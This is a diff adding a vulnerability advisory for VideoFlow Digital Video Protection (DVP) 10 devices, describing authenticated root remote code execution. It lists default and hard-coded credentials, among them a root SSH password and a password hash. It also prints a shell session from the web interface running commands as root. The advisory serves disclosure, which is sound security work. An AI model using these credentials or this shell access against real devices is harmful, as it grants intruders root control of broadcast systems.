@@ -1,0 +1,91 @@
+VideoFlow Digital Video Protection DVP 10 Authenticated Root Remote Code Execution
+
+Vendor: VideoFlow Ltd.
+Product web page: http://www.video-flow.com
+Affected version: 2.10 (X-Prototype-Version: 1.6.0.2)
+
+System = Indicate if the DVP is configured as Protector, Sentinel or Fortress
+Version = The Operating System SW version number
+Image version = Production Image version
+
+                  System: DVP Protector
+                  Version: 1.40.0.15(R) May 5 2015 05:27:05
+                  Image version: 3.07i
+
+                  System: DVP Protector
+                  Version: 1.40.0.15(R) May 5 2015 05:27:05
+                  Image version: 2.08
+
+                  System: DVP Fortress
+                  Version: 2.10.0.5(R) Jan 7 2018 03:26:35
+                  Image version: 3.07
+
+
+Summary: VideoFlow's Digital Video Protection (DVP) product is used by
+leading companies worldwide to boost the reliability of IP networks, including
+the public Internet, for professional live broadcast. DVP enables broadcast
+companies to confidently contribute and distribute live video over IP with
+unprecedented levels of service continuity, at a fraction of the cost of
+leased lines or satellite links. It accelerates ROI by reducing operational
+costs and enabling new revenue streams across a wide variety of markets.
+
+Desc: The affected device suffers from authenticated remote code execution
+vulnerability. Including a CSRF, a remote attacker can exploit this issue
+and execute arbitrary system commands granting her system access with root
+privileges.
+
+Tested on: CentOS release 5.6 (Final) (2.6.18-238.12.1.el5)
+           CentOS release 5.10 (Final) (2.6.18-371.el5)
+           ConfD
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2018-5455
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5455.php
+
+01.02.2018
+
+---
+
+
+Default credentials (web management):
+
+admin:admin
+oper:oper
+private:private
+public:public
+devel:devel
+
+
+Hard-Coded credentials (ssh):
+
+root:videoflow
+mom:$1$CGgdGXXG$0FmyyKMzcHgkKnUTZi5r./
+
+
+-------------------------------- > Tools > System > Shell > --------------------------------
+|                                                                                          |
+| sh-3.2# id;pwd;uname -a;ls                                                               |
+| uid=0(root) gid=0(root)                                                                  |
+| /dvp100/confd                                                                            |
+| Linux localhost.localdomain 2.6.18-371.el5 #1 SMP Tue Oct 1 08:37:57 EDT 2013 i6         |
+| 86 i686 i386 GNU/Linux                                                                   |
+| aaa_cdb.fxs         ietf-inet-types.fxs        SNMP-USER-BASED-SM-MIB.fxs                |
+| authorization.fxs   ietf-yang-types.fxs        SNMPv2-MIB.fxs                            |
+| browser.log         IF-MIB.bin                 SNMPv2-SMI.fxs                            |
+| community_init.xml  IF-MIB.fxs                 SNMPv2-TC.fxs                             |
+| confd.conf          IPV6-TC.fxs                SNMP-VIEW-BASED-ACM-MIB.fxs               |
+| config.web          Makefile                   TRANSPORT-ADDRESS-MIB.fxs                 |
+| docroot             SNMP-COMMUNITY-MIB.fxs     users.fxs                                 |
+| dvp.fxs             SNMP-FRAMEWORK-MIB.fxs     vacm_init.xml                             |
+| dvp_init.xml        SNMP-MPD-MIB.fxs           webspec.dat                               |
+| IANAifType-MIB.bin  SNMP-NOTIFICATION-MIB.fxs                                            |
+| IANAifType-MIB.fxs  SNMP-TARGET-MIB.fxs                                                  |
+| sh-3.2# cat /etc/issue                                                                   |
+| CentOS release 5.10 (Final)                                                              |
+| Kernel \r on an \m                                                                       |
+|                                                                                          |
+--------------------------------------------------------------------------------------------
